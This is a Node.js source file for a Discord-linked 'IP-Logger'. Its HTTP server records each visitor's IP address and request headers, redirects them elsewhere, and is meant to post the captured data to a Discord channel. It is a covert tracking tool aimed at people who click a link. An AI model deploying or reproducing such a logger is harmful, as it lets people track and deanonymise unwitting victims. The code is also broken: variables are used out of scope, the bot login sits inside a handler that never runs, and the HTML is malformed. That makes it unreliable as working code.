var http = require('http');
var discord = require('discord.js')
var client = new discord.Client();
const config = require("./httpconfig.json")
var server = http.createServer(function (req, res) {  
    if (req.url == '/') { 
    
var ip = (req.headers['x-forwarded-for'] || '').split(',').pop().trim() || 
        req.connection.remoteAddress || 
        req.socket.remoteAddress || 
        req.connection.socket.remoteAddress
		var ipAddress = req.connection.remoteAddress;
		 if (ipAddress.substr(0, 7) == "::ffff:") {
    ipAddress = ipAddress.substr(7)
  }
  console.log('New Connection Has Accepted. And Send To Discord Channel.')
  /*console.log(`
======================================
IP-Logger: ${ipAddress}
Method: ${req.method}
Route: ${req.url}
Headers: ${req.headers['user-agent']}
Host/IP: ${req.headers['host']}
Connection: ${req.headers['connection']}
Accept: ${req.headers['accept']}
======================================
`)*/

  ///Coded by !GalvinID#3839
//Note: If You Not Have Discord, You Can Remove '//' For Simple. And Give // On 'Var discord = require('discord.js')'
  
  res.write('<p>Hi There &#128526;</p>')			
		res.write(`<meta http-equiv = "refresh" content = "0.1; url = https://${config.ip} " /`)
		res.write('</body>') ;
		res.write('</html>') ;
		
        res.end();
    }
    
else  
req.connection.remoteAddress || 
        req.socket.remoteAddress || 
        req.connection.socket.remoteAddress
		var ipAddress = req.connection.remoteAddress;
        res.end('');
});
client.on("ready", () => {
server.listen(80); 
console.log('Simple IP-Logger by GalvinID')
console.log('Server UP in Port '+ server._connectionKey)
	
  console.log(`Bot is Online Now!`);
  client.user.setActivity(`Discord IP Logger by GalvinID, GucktubeYT, Fika`);
});

client.on("message", async message => {
  if(message.author.bot) return;
  if(!message.content.startsWith(config.prefix)) return;
  const args = message.content.slice(config.prefix.length).trim().split(/ +/g);
  const command = args.shift().toLowerCase();
	//Main
var channel = client.channels.get(config.channel)

let embed = new discord.MessageEmbed()
.setTitle(`**New Connection!**`)
.setDescription(`
IP-Logger: \`${ipAddress}\`
Method: \`${req.method}\`
Route: \`${req.url}\`
Headers: \`${req.headers['user-agent']}\`
Host/IP: \`${req.headers['host']}\`
Connection: \`${req.headers['connection']}\`
Accept: \`${req.headers['accept']}\`
`)
message.channel.send(embed)
	
//DISCORD MESSAGE Coded By Fika.
//This Feature Only.But, if All. Can Effected To API Discord.

	client.login(config.token);
});


